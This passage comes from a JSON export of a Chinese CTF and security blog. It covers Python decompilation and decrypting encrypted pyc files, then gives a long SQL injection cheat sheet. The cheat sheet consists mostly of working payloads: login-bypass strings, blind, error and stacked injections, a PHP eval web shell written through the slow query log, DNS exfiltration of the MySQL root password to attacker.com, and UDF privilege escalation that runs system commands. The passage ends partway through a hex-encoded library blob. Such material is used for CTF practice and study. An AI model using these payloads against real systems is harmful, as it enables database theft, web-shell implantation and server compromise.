print(long_to_bytes(int(m3,2)))","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"编码","slug":"编码","permalink":"https://lazzzaro.github.io/tags/%E7%BC%96%E7%A0%81/"}],"author":"Lazzaro"},{"title":"python反编译","slug":"reverse-python反编译","date":"2020-05-16T10:29:46.000Z","updated":"2024-08-22T16:42:59.195Z","comments":true,"path":"2020/05/16/reverse-python反编译/","permalink":"https://lazzzaro.github.io/2020/05/16/reverse-python%E5%8F%8D%E7%BC%96%E8%AF%91/","excerpt":"","text":"​ python反编译 .exe → .pycpyinstxtractor https://github.com/extremecoders-re/pyinstxtractor https://github.com/countercept/python-exe-unpacker 命令： pyinstxtractor-ng [filename] python pyinstxtractor.py [filename] 转换出来的主程序格式不对，还需要对其进行手动修复。 需要在该文件起始位置加上8个字节的pyc头，由4字节的magic和4字节的时间戳组成，其中magic会因为python版本的不同而不同，有个技巧就是，查看struct文件的magic，直接复制过去，保存为.pyc文件。 Pyinstaller https://github.com/pyinstaller/pyinstaller 命令： pyi-archive_viewer [filename] python archive_viewer.py [filename] 两者对比文件头，添加12字节： ? x src ? x struct 打开文件夹： ? o PYZ-00.pyz .pyc → .py在线工具 https://pylingual.io/ https://tool.lu/pyc pycdc https://github.com/zrax/pycdc 命令：./pycdc [filename].pyc &gt; [output-filename].py uncompyle6 https://github.com/rocky/python-uncompyle6/ 命令：uncompyle6 [filename].pyc &gt; [output-filename].py （python &lt; 3.9） pydumpck https://github.com/serfend/pydumpck 命令： 123456pydumpck xxx.exepydumpck xxx.elfpydumpck xxx.pycpydumpck xxx.pyzpydumpck xxx.exe --output ./output --thread 8 --timeout 10pydumpck xxx.exe -p pycdc uncompyle6 ​ pyc文件恢复（去混淆）https://www.52pojie.cn/thread-912103-1-1.html 常见版本幻数123456789101112Python 2.7: 03 f3 0d 0aPython 3.0: 3b 0c 0d 0aPython 3.1: 4f 0c 0d 0aPython 3.2: 6c 0c 0d 0aPython 3.3: 9e 0c 0d 0aPython 3.4: ee 0c 0d 0aPython 3.5: 17 0d 0d 0aPython 3.6: 33 0d 0d 0aPython 3.7: 42 0d 0d 0aPython 3.8: 55 0d 0d 0aPython 3.9: 61 0d 0d 0aPython 3.10: 6f 0d 0d 0a 恢复bytecode12345678910111213141516171819202122#安装环境import dis, marshal, sysheader_sizes = [ # (size, first version this applies to) # pyc files were introduced in 0.9.2 way, way back in June 1991. (8, (0, 9, 2)), # 2 bytes magic number, \\r\\n, 4 bytes UNIX timestamp (12, (3, 6)), # added 4 bytes file size # bytes 4-8 are flags, meaning of 9-16 depends on what flags are set # bit 0 not set: 9-12 timestamp, 13-16 file size # bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0) (16, (3, 7)), # inserted 4 bytes bit flag field at 4-8 # future version may add more bytes still, at which point we can extend # this table. It is correct for Python versions up to 3.9]header_size = next(s for s, v in reversed(header_sizes) if sys.version_info &gt;= v)with open(&#x27;main.pyc&#x27;, &quot;rb&quot;) as f: metadata = f.read(header_size) # first header_size bytes are metadata code = marshal.load(f) # rest is a marshalled code objectdis.dis(code) ​ pyc文件解密在反编译python生成可执行文件exe时，引用的类库文件经常遇到使用Crypto模块AES算法加密，解包生成的并不是pyc文件，而是加密的pyc.encrypted文件，它无法查看编译。 第一步，获取Crypto的key，这是打包时由开发者指定的。解包完成后将在根目录形成名为 pyimod00_crypto_key.pyc 的文件，将它转为py文件即可查看key文件。 第二步，编写解密处理的脚本代码 12345678910111213141516171819202122232425262728293031323334import globimport zlibimport tinyaesfrom pathlib import Path CRYPT_BLOCK_SIZE = 16 # key obtained from pyimod00_crypto_keykey = bytes(&#x27;MySup3rS3cr3tK3y&#x27;, &#x27;utf-8&#x27;) for p in Path(&quot;PYZ-00.pyz_extracted&quot;).glob(&quot;**/*.pyc.encrypted&quot;): inf = open(p, &#x27;rb&#x27;) # encrypted file input outf = open(p.with_name(p.stem), &#x27;wb&#x27;) # output file # Initialization vector iv = inf.read(CRYPT_BLOCK_SIZE) cipher = tinyaes.AES(key, iv) # Decrypt and decompress plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read())) # Write pyc header # The header below is for Python 3.8 outf.write(b&#x27;\\x55\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&#x27;) # Write decrypted data outf.write(plaintext) inf.close() outf.close() # Delete .pyc.encrypted file p.unlink() 在前一步中获取的key是必须文件，否则无法进行解密；对于不同python版本头文件（header）也不相同，2.7~3.10如下： 123456789101112Python 2.7: \\x03\\xf3\\x0d\\x0a\\0\\0\\0\\0Python 3.0: \\x3b\\x0c\\x0d\\x0a\\0\\0\\0\\0Python 3.1: \\x4f\\x0c\\x0d\\x0a\\0\\0\\0\\0Python 3.2: \\x6c\\x0c\\x0d\\x0a\\0\\0\\0\\0Python 3.3: \\x9e\\x0c\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.4: \\xee\\x0c\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.5: \\x17\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.6: \\x33\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.7: \\x42\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0Python 3.8: \\x55\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0Python 3.9: \\x61\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0Python 3.10: \\x6f\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0 第三步，执行脚本文件，即可将加密的pyc.encrypted文件转成不加密的pyc文件。","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"反编译","slug":"反编译","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"}],"author":"Lazzaro"},{"title":"fuzz收集","slug":"web-fuzz收集","date":"2020-05-16T07:55:07.000Z","updated":"2020-05-16T07:57:54.874Z","comments":true,"path":"2020/05/16/web-fuzz收集/","permalink":"https://lazzzaro.github.io/2020/05/16/web-fuzz%E6%94%B6%E9%9B%86/","excerpt":"","text":"fuzz收集 任意文件读取https://github.com/ev0A/ArbitraryFileReadList","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"https://lazzzaro.github.io/tags/fuzz/"}],"author":"Lazzaro"},{"title":"SQL注入","slug":"web-SQL注入","date":"2020-05-15T17:43:10.000Z","updated":"2025-04-19T09:09:46.208Z","comments":true,"path":"2020/05/16/web-SQL注入/","permalink":"https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"万能密码123456789admin&#x27; --admin&#x27; #admin&#x27;/\\*&#x27; or 1=1--&#x27; or 1=1#&#x27; or 1=1/*&#x27;) or &#x27;1&#x27;=&#x27;1--&#x27;) or (&#x27;1&#x27;=&#x27;1-- 1&#x27;^1# (False注入) ​ 手注正常注入步骤（联合查询）查库名-&gt;查表名-&gt;查列名（字段名）-&gt;查值（数据） 字段数量猜解 1order by 4 --+ 判断页面回显数据字段位置 1union select 1,2,3,4,x... --+ 数据库名 12345select database()select schema_name from information_schema.schemata;-- MySQL8新特性(&gt;8.0.21)table information_schema.TABLESPACES_EXTENSIONS 表名 1union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database() union查询 12345UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* 列出所有用户自定义数据库中的表 */-- MySQL 4版本时用version=9，MySQL 5版本时用version=10UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* 列出当前数据库中的表 */SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!=&#x27;information_schema&#x27; AND table_schema!=&#x27;mysql&#x27;; 盲注 1234AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &#x27;A&#x27;-- MySQL8新特性and (table information_schema.TABLESPACES_EXTENSIONS limit 1,1)&gt;(BINARY(&#x27;a&#x27;),&#x27;0&#x27;)# 报错 12AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- 在5.1.5版本中成功。 列名（字段名） 1Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name) /*此处的表名为字符串型，也通过十六进制表示*/ union查询 1UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;tablename&#x27; 盲注 1AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &#x27;A&#x27; 报错 1234-- 在5.1.5版本中成功AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- MySQL 5.1版本修复了AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1))); 值查询 1234Union select 1,2,column_name,4,xxx from (database_name.)table_name-- MySQL8新特性and (table flag limit 1,1)&gt;(BINARY(&#x27;a&#x27;))# 无回显 盲注 布尔盲注使用场景：对真/假条件返回的内容很容易区分。 1234567(where | and) if(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;,1,0)select * from users where username=nouser or length(database())&gt;8select * from users where username=nouser or ascii(substr(database(),1,1))&lt;130-- 通配符select * from users where username=&#x27;xxx&#x27; and passwd=&#x27;-1&#x27; or passwd like &#x27;&#123;&#125;%&#x27;# 时间盲注依赖于通过页面返回的延迟时间来判断条件是否正确。 通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。 1234567891011121314151617-- sleep()(where | and) if(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;,sleep(3),1)select * from users where username=$username (and | or) if(length(database())&gt;8,sleep(3),1)-- benchmark()or benchmark(5000000,md5(&#x27;test&#x27;))or if(length(database())&gt;5,benchmark(1500000,md5(&#x27;test&#x27;)),1)-- pg_sleep()(and | or) (case when (select substr(password,1,1) from users)=&#x27;a&#x27; then pg_sleep(5) else pg_sleep(0) end)and (select case when(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;) then (select &#x27;roarctf&#x27; from pg_sleep(3)) else &#x27;1&#x27; end)=&#x27;roarctf&#x27;-- 笛卡尔积 heavy queryselect * from users where id=1 and 1&gt;(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C);select * from users where id=1 and if(1,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;,0) and &#x27;1&#x27;=&#x27;1&#x27;; 报错注入通过特殊函数的错误使用使其参数被页面输出。 前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。 常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等。 123456(where|and|or) exp(~(select * from(select user())a));(where|and|or) pow(~(select * from(select user())a),9999);(where|and|or) updatexml(1,concat(0x7e,(select user()),0x7e),1);(where|and|or) extractvalue(1,concat(0x7e,(select user()),0x7e));(where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)));(where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,ceil(rand(0)*2))); limit注入使用 PROCEDURE函数进行注入，ANALYSE支持两个参数。 123select id from users order by id desc limit 0,1 procedure analyse(1,1);select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);select id from users order by id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16进制文件 update注入1234#盲注update users set username = &#x27;0&#x27;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;update users set username = &#x27;0&#x27; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;update users set id = &#x27;1&#x27; where username like &#x27;f%&#x27; || sleep(5); insert注入123#盲注insert into users values (16,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));insert into users values (15,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d)); order by注入12345#报错注入select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1);#盲注select * from users order by id ^(select(select version()) regexp &#x27;^5&#x27;); group by注入12#盲注select * from users group by 1 having substr((select database()),1,1)=&#x27;c&#x27; 宽字节注入国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠 \\ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \\，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。 GET方式：利用URLencode ?id=1%df&#39;||1=&#123;payload&#125;%23 POST方式：利用UTF-16或UTF-32或中文 ?id=1我&#39;||1=&#123;payload&#125;# ​ 堆叠注入由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。 1234567891011121;show databases;#1;show tables;#1;show columns from [表名];#1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e)/*预处理*/1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;#1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;#1&#x27;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;#1&#x27;;SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;# 二次注入攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。 现在通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode()或者 rawurldecode()函数，则会导致二次解码生成单引号二引发注入，即二次注入。 Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。 addslashes函数虽然在过滤之后会添加 “\\” 进行转义，但是 “\\” 并不会被带到数据库中 二次urldecode注入单引号：%25%27 双引号：%25%22 文件操作读文件 SELECT LOAD_FILE(&#39;/etc/passwd&#39;) SELECT LOAD_FILE(0x2f666c6167) 写文件 SELECT &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/phpinfo.php&#39; select version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x16进制文件 慢查询注入 123set global slow_query_log=1;set global slow_query_log_file=&#x27;/var/www/html/shell.php&#x27;;select &#x27;&lt;?php eval($_GET[a])?&gt;&#x27; or SLEEP(11); ​ Rogue Mysql Server搭建恶意mysql服务器读取文件。 https://github.com/allyshka/Rogue-MySql-Server ​ QuineQuine又叫做自产生程序，在sql注入技术中，这是一种使得输入的sql语句和输出的sql语句一致的技术，常用于一些特殊的登陆绕过sql注入中。 参考：从三道赛题再谈Quine trick 12345SELECT REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;);1&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;)))#-- CHAR =&gt; 0x ​ 绕过（bypass）空格 多层括号嵌套 改用+号 使用注释代替（/*注释内容*/、/*! MYSQL专属*/） and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略 %09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格 单双引号 需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。 不需要跳出单引号的情况：字符串可用16进制表示、也可通过进制转换函数表示成其他进制。 1234-- hex 编码SELECT * FROM Users WHERE username = 0x61646D696E-- char() 函数SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) 逗号 采用 substr((database())from(&#123;&#125;)for(1)) 的形式 采用join：union select * from ((select 1)a join (select 2)b join (select 3)c); 等号 like 用regexp或者in &lt;&gt; 分号 换行 %0a 改变输入结束符：delimiter and / or 双写anandd、oorr 使用运算符代替&amp;&amp;、|| 直接拼接=号，如：?id=1=(condition) 其他方法，如：?id=1^(condition)、?id=1)xor(condition) 无法使用 information、performance：mysql.innodb_table_stats 查表名 union 盲注：&#39;and(select pass from users limit 1)=&#39;secret select 有文件读取权限 12&#x27; and substr(load_file(&#x27;file&#x27;),locate(&#x27;DocumentRoot&#x27;,(load_file(&#x27;file&#x27;)))+length(&#x27;DocumentRoot&#x27;),10)=&#x27;a&#x27;=&#x27;&#x27; into outfile &#x27;/var/www/dump.txt 获取列名 123&#x27; and 列名 is not null#&#x27; procedure analyse()#&#x27;and substr(pass,1,1)=&#x27;a /*使用substr来做过滤条件*/ handler语句代替select查询 1234567/*通过handler语句查询users表的内容*/handler users open as yunensec; /*指定数据表进行载入并将返回句柄重命名*/handler yunensec read first; /*读取指定表/句柄的首行数据*/handler yunensec read next; /*读取指定表/句柄的下一行数据*/handler yunensec read next; /*读取指定表/句柄的下一行数据*/...handler yunensec close; /*关闭句柄*/ limit123&#x27;and(select pass from users where id=1)=&#x27;a&#x27;and(select pass from users group by id having id=1)=&#x27;a&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;a&#x27;)) where join/left join/right join...on... information_schema 替代表：sys.x$schema_flattened_keys 、sys.schema_table_statistics ascii ascii() =&gt; ord() substr substr() =&gt; mid() left() / right() as database() =&gt; schema() if case when order by group by 其他关键字 大小写绕过 双写绕过 使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。 使用 CONCAT() 时，任何个参数为 null，将返回 null，推荐使用 CONCAT_WS()。CONCAT_WS()函数第一个参数表示用哪个字符间隔所查询的结果。 1234SELECT &#x27;a&#x27; &#x27;d&#x27; &#x27;mi&#x27; &#x27;n&#x27;;SELECT CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;);SELECT CONCAT_WS(&#x27;&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;);SELECT GROUP_CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;); 括号 order by 大小比较盲注 数字 用true换1 12def cal(x): return (&#x27;(&#x27;+&#x27;(true)+&#x27;*x)[:-1]+&#x27;)&#x27; 替换表 代替字符 数 代替字符 数 代替字符 数 数 代替字符 false、!pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K true、!(!pi()) 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M floor(pi())、~~pi() 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O floor(version()) //注意版本 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T mysql系统库123456#查询所有非系统自带数据库、表、列select table_schema,table_name,column_name from information_schema.columns where table_schema not in (&#x27;sys&#x27;,&#x27;mysql&#x27;,&#x27;information_schema&#x27;,&#x27;performance_schema&#x27;)#查询指定库的表select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database() sys系统库12345678910111213141516171819#查询所有的库：SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#查询指定库的表（若无则说明此表从未被访问）：SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;#统计所有访问过的表次数:库名,表名,访问次数select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)SELECT user,db,command,current_statement,last_statement,time FROM sys.session;#查看所有曾连接数据库的IP,总连接次数SELECT host,total_connections FROM sys.host_summary;#查看语句的执行记录SELECT * from sys.x$statement_analysis; 无列名注入（or / column 被过滤）12345select group_concat(`2`) from (select 1,2,3 union select * from user)x;select `2` from (select 1,2,3 union select * from user)x limit 1,1;select ((select 1,&#x27;ae&#x27;,0)&gt;(select * from user));union all select * from (select * from users as a join users b using(id,username))c--+extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))# 同步表数据 - 主从复制查看数据库版本：select version(); 在自己vps上起一个相同版本的mariadb，修改默认配置文件 vim /etc/mysql/my.cnf 允许远程访问并启 用二进制日志： 12server-id = 1log_bin = /var/log/mysql/mariadb-bin service mysql restart 自己的vps作为主，题目环境作为从。主服务器执行： 123CREATE USER &#x27;atest&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;testtest&#x27;;grant replication slave on . to &#x27;atest&#x27;@&#x27;%&#x27;;flush privileges; 使用 select database(); show tables; desc game; 等查询命令查看从服务器上的表结构，将从服务器上的数据库结构一比一复刻到主服务器上： 123CREATE DATABASE IF NOT EXISTS game_data;use game_dataCREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ; 在主服务器mysql中执行：show master status; 记录下来 File和 Position：mysql-bin.000001 1376 在从服务器(题目环境)执行： CHANGE MASTER TO MASTER_HOST=&#39;主服务器ip&#39;, MASTER_USER=&#39;atest&#39;, MASTER_PASSWORD=&#39;testtest&#39;, MASTER_LOG_FILE=&#39;mariadb-bin.000001(记录的值)&#39;, MASTER_LOG_POS=1365(记录的值); 显示下面这个表示成功连接上： 12start slave;show slave status; 主服务器中执行：INSERT INTO game ( round , choice ) VALUES (&#39;1&#39;, &#39;R&#39;), (&#39;2&#39;, &#39;R&#39;),(&#39;3&#39;, &#39;R&#39;), (&#39;4&#39;, &#39;R&#39;),(&#39;5&#39;, &#39;R&#39;), (&#39;6&#39;, &#39;R&#39;),(&#39;7&#39;,&#39;R&#39;), (&#39;8&#39;, &#39;R&#39;),(&#39;9&#39;, &#39;R&#39;), (&#39;10&#39;, &#39;R&#39;); 插入从服务器表数据成功。 参考：SYCTF 2023 - Confronting robots 远程连接mysql远程连接中可以执行命令（system 关键字）。 system (!) Execute a system shell command. 参考文https://xz.aliyun.com/t/7169 ​ DNS带外注入（OOB）out-of-band带外数据（OOB）与inband相反，它是一种通过其他传输方式来窃取数据的技术（例如利用DNS解析协议和电子邮件）。OOB技术通常需要易受攻击的实体生成出站TCP/UDP/ICMP请求，然后允许攻击者泄露数据。OOB攻击的成功基于出口防火墙规则，即是否允许来自易受攻击的系统和外围防火墙的出站请求。而从域名服务器（DNS）中提取数据，则被认为是最隐蔽有效的方法。 利用原理： 利用条件： 需要Windows环境 1、DBMS中需要有可用的，能直接或间接引发DNS解析过程的子程序，即使用到UNC 2、Linux没有UNC路径，所以当处于Linux环境，不能使用该方式获取数据 工具： DNSLog.cn CEYE 123456789#secure_file_priv指定文件夹或为空（没有设置）（mysql&gt;5.5.53默认null，禁用导入导出）#查询secure_file_privselect @@secure_file_priv;select @@global.secure_file_priv;show variables like &quot;secure_file_priv&quot;;#注入SELECT LOAD_FILE(CONCAT(&#x27;\\\\\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.attacker.com\\\\foobar&#x27;));select load_file(concat(0x5c5c5c5c,(select database()),0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874)); ​ UDFUDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限。 参考： Mysql UDF 提权 MySQL UDF提权十六进制查询 123456789show variables like &#x27;%plugin%&#x27;;# 通常是/usr/lib/mysql/plugin/select unhex(&#x27;udf.so的十六进制&#x27;) into dumpfile&#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;create function sys_eval returns string soname &#x27;mysqludf.so&#x27;;select sys_eval(&#x27;whoami&#x27;); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#参考脚本#环境：Linux/MariaDBimport requestsurl=&#x27;http://15700a19-71aa-4c90-b3ca-b6db9d77c56d.chall.ctf.show/api/?id=&#x27;code=&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000